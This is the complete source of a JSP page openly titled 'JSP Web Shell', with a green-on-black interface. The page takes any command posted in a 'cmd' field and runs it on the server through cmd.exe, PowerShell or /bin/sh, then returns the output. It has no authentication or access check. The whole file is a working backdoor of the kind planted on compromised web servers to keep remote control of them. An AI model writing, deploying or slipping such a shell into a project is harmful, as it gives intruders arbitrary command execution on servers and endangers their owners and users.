<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>JSP Web Shell</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .panel {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .panel h2 {
            color: #00ff00;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 5px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
        }
        
        input[type="text"], select, textarea {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        
        textarea {
            resize: vertical;
            min-height: 80px;
            max-height: 300px;
            line-height: 1.4;
        }
        
        input[type="text"]:focus, select:focus, textarea:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        
        button {
            background: #000;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            margin-right: 10px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        
        .output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 4px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
        }
        

        
        .platform-selector {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .platform-btn {
            padding: 8px 15px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            border-radius: 4px;
        }
        
        .platform-btn.active {
            background: #00ff00;
            color: #000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>JSP Web Shell</h1>
        

        <!-- Command Execution Panel -->
        <div class="panel">
            <h2>Command Execution</h2>
            <form method="POST" action="cmd.jsp">
                <div class="form-group">
                    <label>Platform Selection:</label>
                    <div class="platform-selector">
                        <%
                            String selectedPlatform = request.getParameter("platform");
                            String osName = System.getProperty("os.name").toLowerCase();
                            boolean isWindows = osName.contains("win");
                            
                            // Set default platform based on server OS if not specified
                            if(selectedPlatform == null) {
                                if(isWindows) {
                                    selectedPlatform = "windows-cmd";
                                } else {
                                    selectedPlatform = "linux-sh";
                                }
                            }
                        %>
                        <% if(isWindows) { %>
                            <div class="platform-btn <%=selectedPlatform.equals("windows-cmd") ? "active" : ""%>" onclick="selectPlatform('windows-cmd')">Windows CMD</div>
                            <div class="platform-btn <%=selectedPlatform.equals("windows-ps") ? "active" : ""%>" onclick="selectPlatform('windows-ps')">Windows PowerShell</div>
                        <% } else { %>
                            <div class="platform-btn <%=selectedPlatform.equals("linux-sh") ? "active" : ""%>" onclick="selectPlatform('linux-sh')">Linux SH</div>
                        <% } %>
                    </div>
                    <input type="hidden" name="platform" id="platform" value="<%=selectedPlatform%>">
                </div>
                
                <div class="form-group">
                    <label for="cmd">Command:</label>
                    <textarea name="cmd" id="cmd" rows="4" placeholder="Enter command to execute..." autocomplete="off"></textarea>
                </div>
                
                <button type="submit">Execute</button>
                <button type="button" onclick="clearOutput()">Clear</button>
            </form>
            
            <div class="output" id="output"><%
                String cmd = request.getParameter("cmd");
                String platform = request.getParameter("platform");
                String output = "";
                
                if(cmd != null && !cmd.trim().isEmpty()) {
                    try {
                        String[] command;
                        String osNameForCmd = System.getProperty("os.name").toLowerCase();
                        
                        // Create command based on platform selection
                        if(platform != null) {
                            if(platform.equals("windows-cmd")) {
                                command = new String[]{"cmd.exe", "/c", cmd};
                            } else if(platform.equals("windows-ps")) {
                                command = new String[]{"powershell.exe", "-Command", cmd};
                            } else if(platform.equals("linux-sh")) {
                                command = new String[]{"/bin/sh", "-c", cmd};
                            } else {
                                // Automatic platform detection
                                if(osNameForCmd.contains("win")) {
                                    command = new String[]{"cmd.exe", "/c", cmd};
                                } else {
                                    command = new String[]{"/bin/sh", "-c", cmd};
                                }
                            }
                        } else {
                            // Default platform detection
                            if(osNameForCmd.contains("win")) {
                                command = new String[]{"cmd.exe", "/c", cmd};
                            } else {
                                command = new String[]{"/bin/sh", "-c", cmd};
                            }
                        }
                        
                        ProcessBuilder pb = new ProcessBuilder(command);
                        pb.redirectErrorStream(true);
                        Process p = pb.start();
                        
                        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        
                        while((line = reader.readLine()) != null) {
                            sb.append(line).append("\n");
                        }
                        
                        int exitCode = p.waitFor();
                        output = sb.toString();
                        
                        if(output.trim().isEmpty()) {
                            output = "Command executed successfully. (Exit Code: " + exitCode + ")";
                        }
                        
                    } catch(Exception e) {
                        output = "Error: " + e.getMessage();
                        e.printStackTrace();
                    }
                }
                
                if(!output.isEmpty()) {
                    out.print(output);
                }
            %></div>
        </div>
    </div>
    
    <script>
        // Platform selection
        function selectPlatform(platform) {
            document.getElementById('platform').value = platform;
            
            // Update active button style
            var buttons = document.getElementsByClassName('platform-btn');
            for(var i = 0; i < buttons.length; i++) {
                buttons[i].className = buttons[i].className.replace(' active', '');
            }
            
            // Add active class to clicked button
            var clickedElement = window.event ? window.event.srcElement : arguments.callee.caller.arguments[0].target;
            if(clickedElement.className.indexOf('active') === -1) {
                clickedElement.className += ' active';
            }
        }
        
        // Clear output
        function clearOutput() {
            document.getElementById('output').innerHTML = '';
        }
        
        // Form submission with Ctrl+Enter key
        document.getElementById('cmd').onkeydown = function(e) {
            e = e || window.event;
            if((e.keyCode === 13 || e.which === 13) && e.ctrlKey) {
                if(e.preventDefault) {
                    e.preventDefault();
                } else {
                    e.returnValue = false;
                }
                this.form.submit();
            }
        };
        

        
        // Focus on page load
        window.onload = function() {
            document.getElementById('cmd').focus();
        };
    </script>
</body>
</html>
